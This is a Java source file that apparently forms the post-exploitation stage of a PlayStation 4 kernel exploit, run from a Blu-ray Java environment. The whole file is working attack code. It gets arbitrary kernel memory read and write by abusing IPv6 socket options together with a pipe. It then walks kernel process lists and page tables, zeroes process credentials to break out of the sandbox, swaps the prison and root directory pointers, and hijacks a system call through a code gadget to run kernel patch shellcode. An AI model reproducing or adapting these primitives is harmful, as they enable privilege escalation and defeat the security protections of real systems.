package org.bdj.external;

import org.bdj.api.API;
import org.bdj.api.Buffer;

public class Kernel {
  private static API api;
  
  static {
    try {
      api = API.getInstance();
    } catch (Exception exception) {
      throw new ExceptionInInitializerError(exception);
    } 
  }
  
  public static class KernelAddresses
  {
    public long evfString = 0L;
    public long curproc = 0L;
    public long dataBase = 0L;
    public long curprocFd = 0L;
    public long curprocOfiles = 0L;
    public long insideKdata = 0L;
    public long dmapBase = 0L;
    public long kernelCr3 = 0L;
    public long allproc = 0L;
    public long base = 0L;
    
    public boolean isInitialized() {
      return (this.curproc != 0L && this.insideKdata != 0L);
    }
    
    public void reset() {
      this.evfString = 0L;
      this.curproc = 0L;
      this.dataBase = 0L;
      this.curprocFd = 0L;
      this.curprocOfiles = 0L;
      this.insideKdata = 0L;
      this.dmapBase = 0L;
      this.kernelCr3 = 0L;
      this.allproc = 0L;
      this.base = 0L;
    }
  }
  
  public static KernelAddresses addr = new KernelAddresses();













  
  public static KernelInterface kernelRW = null; private static final long CPU_PG_PHYS_FRAME = 4503599627366400L; private static final long CPU_PG_PS_FRAME = 4503599625273344L;
  public static interface KernelInterface {
    void copyout(long param1Long1, long param1Long2, int param1Int);
    void copyin(long param1Long1, long param1Long2, int param1Int);
    void readBuffer(long param1Long, Buffer param1Buffer, int param1Int);
    void writeBuffer(long param1Long, Buffer param1Buffer, int param1Int);
    long kread8(long param1Long);
    void kwrite8(long param1Long1, long param1Long2);
    int kread32(long param1Long);
    void kwrite32(long param1Long, int param1Int); }
  public static class KernelRW implements KernelInterface { private int masterSock; private int workerSock;
    private int pipeReadFd = -1; private Buffer masterTargetBuffer; private Buffer slaveBuffer; private long curprocOfiles;
    private int pipeWriteFd = -1;
    private long pipeAddr = 0L;
    private Buffer pipemapBuffer;
    private Buffer readMem;
    private boolean pipeInitialized = false;
    
    public KernelRW(int param1Int1, int param1Int2, long param1Long) {
      this.masterSock = param1Int1;
      this.workerSock = param1Int2;
      this.curprocOfiles = param1Long;
      
      this.masterTargetBuffer = new Buffer(20);
      this.slaveBuffer = new Buffer(20);
      this.pipemapBuffer = new Buffer(20);
      this.readMem = new Buffer(4096);
    }
    
    public void initializePipeRW() {
      if (this.pipeInitialized)
        return; 
      createPipePair();
      
      if (this.pipeReadFd > 0 && this.pipeWriteFd > 0) {
        this.pipeAddr = getFdDataAddr(this.pipeReadFd);
        if (this.pipeAddr >>> 48L == 65535L) {
          this.pipeInitialized = true;
          Kernel.kernelRW = this;
        } 
      } 
    }


    
    private void createPipePair() {
      Buffer buffer = new Buffer(8);
      long l = Helper.syscall(42, buffer.address());
      if (l == 0L) {
        this.pipeReadFd = buffer.getInt(0);
        this.pipeWriteFd = buffer.getInt(4);
      } 
    }
    
    private void ipv6WriteToVictim(long param1Long) {
      this.masterTargetBuffer.putLong(0, param1Long);
      this.masterTargetBuffer.putLong(8, 0L);
      this.masterTargetBuffer.putInt(16, 0);
      Helper.setSockOpt(this.masterSock, 41, 46, this.masterTargetBuffer, 20);
    }
    
    private void ipv6KernelRead(long param1Long, Buffer param1Buffer) {
      ipv6WriteToVictim(param1Long);
      Helper.getSockOpt(this.workerSock, 41, 46, param1Buffer, 20);
    }
    
    private void ipv6KernelWrite(long param1Long, Buffer param1Buffer) {
      ipv6WriteToVictim(param1Long);
      Helper.setSockOpt(this.workerSock, 41, 46, param1Buffer, 20);
    }
    
    private long ipv6KernelRead8(long param1Long) {
      ipv6KernelRead(param1Long, this.slaveBuffer);
      return this.slaveBuffer.getLong(0);
    }
    
    private void ipv6KernelWrite8(long param1Long1, long param1Long2) {
      this.slaveBuffer.putLong(0, param1Long2);
      this.slaveBuffer.putLong(8, 0L);
      this.slaveBuffer.putInt(16, 0);
      ipv6KernelWrite(param1Long1, this.slaveBuffer);
    }
    
    public void copyout(long param1Long1, long param1Long2, int param1Int) {
      this.pipemapBuffer.putLong(0, 4611686019501129728L);
      this.pipemapBuffer.putLong(8, 4611686018427387904L);
      this.pipemapBuffer.putInt(16, 0);
      ipv6KernelWrite(this.pipeAddr, this.pipemapBuffer);
      
      this.pipemapBuffer.putLong(0, param1Long1);
      this.pipemapBuffer.putLong(8, 0L);
      this.pipemapBuffer.putInt(16, 0);
      ipv6KernelWrite(this.pipeAddr + 16L, this.pipemapBuffer);
      
      Helper.syscall(3, this.pipeReadFd, param1Long2, param1Int);
    }
    
    public void copyin(long param1Long1, long param1Long2, int param1Int) {
      this.pipemapBuffer.putLong(0, 0L);
      this.pipemapBuffer.putLong(8, 4611686018427387904L);
      this.pipemapBuffer.putInt(16, 0);
      ipv6KernelWrite(this.pipeAddr, this.pipemapBuffer);
      
      this.pipemapBuffer.putLong(0, param1Long2);
      this.pipemapBuffer.putLong(8, 0L);
      this.pipemapBuffer.putInt(16, 0);
      ipv6KernelWrite(this.pipeAddr + 16L, this.pipemapBuffer);
      
      Helper.syscall(4, this.pipeWriteFd, param1Long1, param1Int);
    }
    
    public void readBuffer(long param1Long, Buffer param1Buffer, int param1Int) {
      Buffer buffer = this.readMem;
      copyout(param1Long, buffer.address(), param1Int);
      for (byte b = 0; b < param1Int; b++) {
        param1Buffer.putByte(b, buffer.getByte(b));
      }
    }
    
    public void writeBuffer(long param1Long, Buffer param1Buffer, int param1Int) {
      copyin(param1Buffer.address(), param1Long, param1Int);
    }
    
    public long getFdDataAddr(int param1Int) {
      long l1 = this.curprocOfiles + (param1Int * 8);
      long l2 = ipv6KernelRead8(l1 + 0L);
      return ipv6KernelRead8(l2 + 0L);
    }
    
    public long getSockPktopts(int param1Int) {
      long l1 = getFdDataAddr(param1Int);
      long l2 = ipv6KernelRead8(l1 + 24L);
      return ipv6KernelRead8(l2 + 280L);
    }

    
    public void setupPktinfo(long param1Long) {
      this.masterTargetBuffer.putLong(0, param1Long + 16L);
      this.masterTargetBuffer.putLong(8, 0L);
      this.masterTargetBuffer.putInt(16, 0);
      Helper.setSockOpt(this.masterSock, 41, 46, this.masterTargetBuffer, 20);

      
      initializePipeRW();
    }
    
    public long kread8(long param1Long) {
      Buffer buffer = new Buffer(8);
      readBuffer(param1Long, buffer, 8);
      return buffer.getLong(0);
    }
    
    public void kwrite8(long param1Long1, long param1Long2) {
      Buffer buffer = new Buffer(8);
      buffer.putLong(0, param1Long2);
      writeBuffer(param1Long1, buffer, 8);
    }
    
    public int kread32(long param1Long) {
      Buffer buffer = new Buffer(4);
      readBuffer(param1Long, buffer, 4);
      return buffer.getInt(0);
    }
    
    public void kwrite32(long param1Long, int param1Int) {
      Buffer buffer = new Buffer(4);
      buffer.putInt(0, param1Int);
      writeBuffer(param1Long, buffer, 4);
    } }


  
  public static String readNullTerminatedString(long paramLong) {
    if (!isKernelRWAvailable()) {
      return "";
    }
    
    StringBuffer stringBuffer = new StringBuffer();
    
    while (stringBuffer.length() < 1000) {
      long l = kernelRW.kread8(paramLong);
      
      for (byte b = 0; b < 8; b++) {
        byte b1 = (byte)(int)(l >>> b * 8 & 0xFFL);
        if (b1 == 0) {
          return stringBuffer.toString();
        }
        if (b1 >= 32 && b1 <= 126) {
          stringBuffer.append((char)(b1 & 0xFF));
        } else {
          return stringBuffer.toString();
        } 
      } 
      
      paramLong += 8L;
    } 
    
    return stringBuffer.toString();
  }
  
  public static long slowKread8(int paramInt1, Buffer paramBuffer1, int paramInt2, Buffer paramBuffer2, long paramLong) {
    byte b1 = 8;
    int i = 0;
    
    for (byte b2 = 0; b2 < b1; b2++) {
      paramBuffer2.putByte(b2, (byte)0);
    }
    
    while (i < b1) {
      paramBuffer1.putLong(8, paramLong + i);
      Helper.setSockOpt(paramInt1, 41, 46, paramBuffer1, paramInt2);
      
      Buffer buffer = new Buffer(b1 - i);
      int j = Helper.getSockOpt(paramInt1, 41, 48, buffer, b1 - i);
      
      if (j == 0) {
        paramBuffer2.putByte(i, (byte)0);
        i++; continue;
      } 
      for (byte b = 0; b < j; b++) {
        paramBuffer2.putByte(i + b, buffer.getByte(b));
      }
      i += j;
    } 

    
    return paramBuffer2.getLong(0);
  }
  
  public static long getFdDataAddrSlow(int paramInt1, Buffer paramBuffer1, int paramInt2, Buffer paramBuffer2, int paramInt3, long paramLong) {
    long l1 = paramLong + (paramInt3 * 8);
    long l2 = slowKread8(paramInt1, paramBuffer1, paramInt2, paramBuffer2, l1 + 0L);
    return slowKread8(paramInt1, paramBuffer1, paramInt2, paramBuffer2, l2 + 0L);
  }
  
  public static long findProcByName(String paramString) {
    if (!isKernelRWAvailable()) {
      return 0L;
    }
    
    long l = kernelRW.kread8(addr.allproc);
    byte b = 0;
    
    while (l != 0L && b < 100) {
      String str = readNullTerminatedString(l + 1096L);
      if (paramString.equals(str)) {
        return l;
      }
      l = kernelRW.kread8(l + 0L);
      b++;
    } 
    
    return 0L;
  }
  
  public static long findProcByPid(int paramInt) {
    if (!isKernelRWAvailable()) {
      return 0L;
    }
    
    long l = kernelRW.kread8(addr.allproc);
    byte b = 0;
    
    while (l != 0L && b < 100) {
      int i = kernelRW.kread32(l + 176L);
      if (i == paramInt) {
        return l;
      }
      l = kernelRW.kread8(l + 0L);
      b++;
    } 
    
    return 0L;
  }
  
  public static long getProcCr3(long paramLong) {
    long l1 = kernelRW.kread8(paramLong + 512L);
    long l2 = kernelRW.kread8(l1 + 456L);
    return kernelRW.kread8(l2 + 40L);
  }
  
  public static long virtToPhys(long paramLong1, long paramLong2) {
    if (paramLong2 == 0L) {
      paramLong2 = addr.kernelCr3;
    }
    return cpuWalkPt(paramLong2, paramLong1);
  }
  
  public static long physToDmap(long paramLong) {
    return addr.dmapBase + paramLong;
  }




  
  private static int cpuPdeField(long paramLong, String paramString) {
    byte b = 0;
    boolean bool = false;
    
    if ("PRESENT".equals(paramString)) { b = 0; bool = true; }
    else if ("RW".equals(paramString)) { b = 1; bool = true; }
    else if ("USER".equals(paramString)) { b = 2; bool = true; }
    else if ("PS".equals(paramString)) { b = 7; bool = true; }
    else if ("EXECUTE_DISABLE".equals(paramString)) { b = 63; bool = true; }
    
    return (int)(paramLong >>> b & bool);
  }
  
  public static long cpuWalkPt(long paramLong1, long paramLong2) {
    long l1 = paramLong2 >>> 39L & 0x1FFL;
    long l2 = paramLong2 >>> 30L & 0x1FFL;
    long l3 = paramLong2 >>> 21L & 0x1FFL;
    long l4 = paramLong2 >>> 12L & 0x1FFL;

    
    long l5 = kernelRW.kread8(physToDmap(paramLong1) + l1 * 8L);
    if (cpuPdeField(l5, "PRESENT") != 1) {
      return 0L;
    }

    
    long l6 = l5 & 0xFFFFFFFFFF000L;
    long l7 = physToDmap(l6) + l2 * 8L;
    long l8 = kernelRW.kread8(l7);
    
    if (cpuPdeField(l8, "PRESENT") != 1) {
      return 0L;
    }

    
    long l9 = l8 & 0xFFFFFFFFFF000L;
    long l10 = physToDmap(l9) + l3 * 8L;
    long l11 = kernelRW.kread8(l10);
    
    if (cpuPdeField(l11, "PRESENT") != 1) {
      return 0L;
    }

    
    if (cpuPdeField(l11, "PS") == 1) {
      return l11 & 0xFFFFFFFE00000L | paramLong2 & 0x1FFFFFL;
    }

    
    long l12 = l11 & 0xFFFFFFFFFF000L;
    long l13 = physToDmap(l12) + l4 * 8L;
    long l14 = kernelRW.kread8(l13);
    
    if (cpuPdeField(l14, "PRESENT") != 1) {
      return 0L;
    }
    
    return l14 & 0xFFFFFFFFFF000L | paramLong2 & 0x3FFFL;
  }

  
  public static boolean postExploitationPS4() {
    if (addr.curproc == 0L || addr.insideKdata == 0L) {
      return false;
    }
    
    long l = addr.insideKdata;
    
    String str = readNullTerminatedString(l);
    if (!"evf cv".equals(str)) {
      return false;
    }
    
    addr.dataBase = l - KernelOffset.getPS4Offset("EVF_OFFSET");
    
    if (!verifyElfHeader()) {
      return false;
    }
    
    if (!escapeSandbox(addr.curproc)) {
      return false;
    }
    
    applyKernelPatchesPS4();

    
    return true;
  }
  
  private static boolean verifyElfHeader() {
    long l = kernelRW.kread8(addr.dataBase);
    
    int i = (int)(l & 0xFFL);
    int j = (int)(l >>> 8L & 0xFFL);
    int k = (int)(l >>> 16L & 0xFFL);
    int m = (int)(l >>> 24L & 0xFFL);

    
    if (i == 127 && j == 69 && k == 76 && m == 70) {
      return true;
    }

    
    return false;
  }

  
  private static boolean escapeSandbox(long paramLong) {
    if (paramLong >>> 48L != 65535L) {
      return false;
    }
    
    long l1 = addr.dataBase + KernelOffset.getPS4Offset("PRISON0");
    long l2 = addr.dataBase + KernelOffset.getPS4Offset("ROOTVNODE");
    long l3 = 64L;
    
    long l4 = kernelRW.kread8(paramLong + 72L);
    long l5 = kernelRW.kread8(paramLong + l3);
    
    if (l4 >>> 48L != 65535L || l5 >>> 48L != 65535L) {
      return false;
    }

    
    kernelRW.kwrite32(l5 + 4L, 0);
    kernelRW.kwrite32(l5 + 8L, 0);
    kernelRW.kwrite32(l5 + 12L, 0);
    kernelRW.kwrite32(l5 + 16L, 1);
    kernelRW.kwrite32(l5 + 20L, 0);
    
    long l6 = kernelRW.kread8(l1);
    if (l6 >>> 48L != 65535L) {
      return false;
    }
    kernelRW.kwrite8(l5 + 48L, l6);

    
    kernelRW.kwrite8(l5 + 96L, -1L);
    kernelRW.kwrite8(l5 + 104L, -1L);
    
    long l7 = kernelRW.kread8(l2);
    if (l7 >>> 48L != 65535L) {
      return false;
    }
    kernelRW.kwrite8(l4 + 16L, l7);
    kernelRW.kwrite8(l4 + 24L, l7);

    
    return true;
  }

  
  private static void applyKernelPatchesPS4() {
    byte[] arrayOfByte = KernelOffset.getKernelPatchesShellcode();
    if (arrayOfByte.length == 0) {
      return;
    }

    
    long l1 = 39192625152L;
    long l2 = 39293288448L;
    
    long l3 = addr.dataBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
    int i = kernelRW.kread32(l3);
    long l4 = kernelRW.kread8(l3 + 8L);
    int j = kernelRW.kread32(l3 + 44L);
    
    kernelRW.kwrite32(l3, 2);
    kernelRW.kwrite8(l3 + 8L, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
    kernelRW.kwrite32(l3 + 44L, 1);
    
    byte b1 = 1;
    byte b2 = 2;
    byte b3 = 4;
    int k = b1 | b2;
    int m = b1 | b2 | b3;
    
    int n = 65536;

    
    long l5 = Helper.syscall(533, 0L, n, m);

    
    long l6 = Helper.syscall(534, l5, k);

    
    Helper.syscall(477, l2, n, k, 17L, l6, 0L);
    
    for (byte b4 = 0; b4 < arrayOfByte.length; b4++) {
      api.write8(l2 + b4, arrayOfByte[b4]);
    }

    
    Helper.syscall(477, l1, n, m, 17L, l5, 0L);
    
    Helper.syscall(661, l1);

    
    kernelRW.kwrite32(l3, i);
    kernelRW.kwrite8(l3 + 8L, l4);
    kernelRW.kwrite32(l3 + 44L, j);
    
    Helper.syscall(6, l6);
  }

  
  public static void setKernelAddresses(long paramLong1, long paramLong2, long paramLong3, long paramLong4) {
    addr.curproc = paramLong1;
    addr.curprocOfiles = paramLong2;
    addr.insideKdata = paramLong3;
    addr.allproc = paramLong4;
  }

  
  public static boolean isKernelRWAvailable() {
    return (kernelRW != null && addr.isInitialized());
  }
  
  public static void initializeKernelOffsets() {
    KernelOffset.initializeFromHelper();
  }
}
